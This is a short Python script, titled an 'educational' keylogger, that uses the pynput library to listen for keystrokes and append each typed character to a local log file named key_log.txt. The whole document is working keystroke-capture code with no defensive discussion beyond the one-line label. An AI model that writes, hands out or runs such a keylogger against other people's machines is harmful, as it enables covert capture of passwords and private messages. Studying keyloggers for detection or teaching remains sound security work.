# Educational Keylogger Example (for demonstration only)
from pynput import keyboard

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Append regular character keystrokes
        with open(LOG_FILE, "a") as f:
            print(key)
            f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        # with open(LOG_FILE, "a") as f:
        #    f.write("[" + str(key) + "]")
        pass

# Set up the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    